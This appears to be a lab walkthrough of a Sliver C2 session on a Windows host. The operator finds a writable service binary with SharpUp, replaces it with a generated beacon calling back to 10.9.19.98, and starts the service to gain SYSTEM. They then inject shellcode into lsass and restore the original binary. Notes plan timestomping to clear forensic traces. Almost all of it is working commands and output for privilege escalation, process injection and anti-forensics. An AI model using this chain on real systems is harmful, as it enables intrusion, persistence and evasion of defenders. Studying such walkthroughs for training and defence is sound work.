# Sliver

## 01 - Detect

```
sliver (HOT_MANTEL) > whoami

Logon ID: TCM-PC\user
[*] Tasked beacon HOT_MANTEL (4a82d783)

[+] HOT_MANTEL completed task 4a82d783

sliver (HOT_MANTEL) > sharpup audit ModifiableServiceBinaries

[*] Tasked beacon HOT_MANTEL (a3d6995f)

[+] HOT_MANTEL completed task a3d6995f

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===
        Service 'filepermsvc' (State: Stopped, StartMode: Manual) : "C:\Program Files\File Permissions Service\filepermservice.exe"



[*] Completed Privesc Checks in 0 seconds
```

## 02 - Exploit

Backup the original binary file to clear forensics

TODO: list the binary file to perform timestomp technique

```
Backup the original binary file to clear forensics

sliver (HOT_MANTEL) > download "C:\Program Files\File Permissions Service\filepermservice.exe" backups/filepermservice.exe

[*] Tasked beacon HOT_MANTEL (9ed7e348)

[+] HOT_MANTEL completed task 9ed7e348

[*] Wrote 9216 bytes (1 file successfully, 0 files unsuccessfully) to /home/user/backups/filepermservice.exe

sliver (HOT_MANTEL) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -a x64 -o windows -f service

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/user/DIRECT_GONG.exe

sliver (HOT_MANTEL) > upload DIRECT_GONG.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Tasked beacon HOT_MANTEL (ec14c9bd)

[+] HOT_MANTEL completed task ec14c9bd

[*] Wrote file to C:\Program Files\File Permissions Service\filepermservice.exe

sliver (HOT_MANTEL) > execute sc start filepermsvc

[*] Tasked beacon HOT_MANTEL (ef895201)

[+] HOT_MANTEL completed task ef895201

[*] Command executed successfully

[*] Beacon 89ff6d18 DIRECT_GONG - 10.10.160.174:49298 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 09:32:33 EST

sliver (HOT_MANTEL) > use 89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b

[*] Active beacon DIRECT_GONG (89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b)

sliver (DIRECT_GONG) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Tasked beacon DIRECT_GONG (8ce40ea1)

[+] DIRECT_GONG completed task 8ce40ea1
```

## 03 - Cleanup

TODO: Use `chtimes` command

```
sliver (DIRECT_GONG) > upload backups/filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Tasked beacon DIRECT_GONG (28bba2f6)

[+] DIRECT_GONG completed task 28bba2f6

[!] open C:\Program Files\File Permissions Service\filepermservice.exe: The process cannot access the file because it is being used by another process.

sliver (DIRECT_GONG) > ps

[*] Tasked beacon DIRECT_GONG (38d6d854)

[+] DIRECT_GONG completed task 38d6d854

 Pid    Ppid   Owner                          Arch     Executable             Session
====== ====== ============================== ======== ====================== =========
 0      0                                              [System Process]
 4      0                                     x86_64   System
 404    4      NT AUTHORITY\SYSTEM            x86_64   smss.exe
 532    524    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 580    524    NT AUTHORITY\SYSTEM            x86_64   wininit.exe
 588    572    NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 628    572    NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 676    580    NT AUTHORITY\SYSTEM            x86_64   services.exe
 684    580    NT AUTHORITY\SYSTEM            x86_64   lsass.exe
 696    580    NT AUTHORITY\SYSTEM            x86_64   lsm.exe
 784    676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 860    676    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 932    628    NT AUTHORITY\SYSTEM            x86_64   LogonUI.exe
 948    676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 996    676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1020   676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 544    676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1080   676    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1212   676    NT AUTHORITY\SYSTEM            x86_64   spoolsv.exe
 1252   676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1368   676    NT AUTHORITY\SYSTEM            x86_64   amazon-ssm-agent.exe
 1460   676    NT AUTHORITY\SYSTEM            x86_64   LiteAgent.exe
 1488   676    NT AUTHORITY\LOCAL SERVICE     x86_64   svchost.exe
 1640   676    NT AUTHORITY\SYSTEM            x86_64   Ec2Config.exe
 1920   676    NT AUTHORITY\SYSTEM            x86_64   svchost.exe
 1944   676    NT AUTHORITY\NETWORK SERVICE   x86_64   svchost.exe
 1896   784    NT AUTHORITY\NETWORK SERVICE   x86_64   WmiPrvSE.exe
 2324   2316   NT AUTHORITY\SYSTEM            x86_64   csrss.exe
 2348   2316   NT AUTHORITY\SYSTEM            x86_64   winlogon.exe
 2568   676    TCM-PC\user                    x86_64   taskhost.exe
 2700   1080   TCM-PC\user                    x86_64   rdpclip.exe
 2732   996    TCM-PC\user                    x86_64   dwm.exe
 2780   2720   TCM-PC\user                    x86_64   explorer.exe
 2320   676    NT AUTHORITY\SYSTEM            x86_64   TrustedInstaller.exe
 2064   676    NT AUTHORITY\SYSTEM            x86_64   SearchIndexer.exe
 2916   2780   TCM-PC\user                    x86_64   HOT_MANTEL.exe
 1468   676    NT AUTHORITY\SYSTEM            x86_64   mscorsvw.exe
 1812   676    NT AUTHORITY\NETWORK SERVICE   x86_64   sppsvc.exe
 1872   676    NT AUTHORITY\NETWORK SERVICE   x86_64   wmpnetwk.exe
 1816   676    NT AUTHORITY\SYSTEM            x86_64   filepermservice.exe

sliver (DIRECT_GONG) > generate beacon -m 10.9.19.98 -S 5 -J 10 -l -G -a x64 -o windows -f shellcode

[*] Generating new windows/amd64 beacon implant binary (5s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[!] Shikata ga nai encoder is disabled
[*] Implant saved to /home/user/BLUSHING_ROUTINE.bin

sliver (DIRECT_GONG) > execute-shellcode -p 684 BLUSHING_ROUTINE.bin

[*] Tasked beacon DIRECT_GONG (3fd53ff9)

[+] DIRECT_GONG completed task 3fd53ff9

[*] Executed shellcode on target

[*] Beacon 55287128 BLUSHING_ROUTINE - 10.10.160.174:49394 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 09:40:04 EST

sliver (DIRECT_GONG) > beacons

 ID         Name               Tasks   Transport   Remote Address        Hostname   Username              Operating System   Locale   Last Check-In                            Next Check-In
========== ================== ======= =========== ===================== ========== ===================== ================== ======== ======================================== =======================================
 095f9a08   HOT_MANTEL         10/10   mtls        10.10.160.174:49176   TCM-PC     user                  windows/amd64      en-US    Fri Nov 18 09:39:56 EST 2022 (12s ago)   Fri Nov 18 09:40:08 EST 2022 (0s ago)
 89ff6d18   DIRECT_GONG        4/4     mtls        10.10.160.174:49348   TCM-PC     NT AUTHORITY\SYSTEM   windows/amd64      en-US    Fri Nov 18 09:40:06 EST 2022 (2s ago)    Fri Nov 18 09:40:16 EST 2022 (in 8s)
 55287128   BLUSHING_ROUTINE   0/0     mtls        10.10.160.174:49394   TCM-PC     NT AUTHORITY\SYSTEM   windows/amd64      en-US    Fri Nov 18 09:40:05 EST 2022 (3s ago)    Fri Nov 18 09:40:16 EST 2022 (in 8s)

sliver (DIRECT_GONG) > use 55287128-d91e-4007-bb12-301dffae1375

[*] Active beacon BLUSHING_ROUTINE (55287128-d91e-4007-bb12-301dffae1375)
```

Terminate previous beacons

```
sliver (BLUSHING_ROUTINE) > beacons rm

? Select a beacon: 095f9a08-1669-42b3-a54b-7f8b93e183f1  HOT_MANTEL        10.10.160.174:49176  TCM-PC  TCM-PC\user          windows/amd64
[*] Beacon removed (095f9a08-1669-42b3-a54b-7f8b93e183f1)

sliver (BLUSHING_ROUTINE) > beacons rm

? Select a beacon: 89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b  DIRECT_GONG       10.10.160.174:49348  TCM-PC  NT AUTHORITY\SYSTEM  windows/amd64
[*] Beacon removed (89ff6d18-2cdf-44bb-a60b-5f68cafbcb0b)

sliver (BLUSHING_ROUTINE) > upload backups/filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Tasked beacon BLUSHING_ROUTINE (9047317b)

[+] BLUSHING_ROUTINE completed task 9047317b

[!] open C:\Program Files\File Permissions Service\filepermservice.exe: The process cannot access the file because it is being used by another process.

sliver (BLUSHING_ROUTINE) > interactive

[*] Using beacon's active C2 endpoint: mtls://10.9.19.98:8888
[*] Tasked beacon BLUSHING_ROUTINE (323ace34)

[*] Session 8c2074e2 BLUSHING_ROUTINE - 10.10.160.174:49416 (TCM-PC) - windows/amd64 - Fri, 18 Nov 2022 09:41:06 EST

sliver (BLUSHING_ROUTINE) > sessions -i 8

[*] Active session BLUSHING_ROUTINE (8c2074e2)

sliver (BLUSHING_ROUTINE) > terminate 1816

[*] Process 1816 has been terminated

sliver (BLUSHING_ROUTINE) > upload backups/filepermservice.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

[*] Wrote file to C:\Program Files\File Permissions Service\filepermservice.exe
```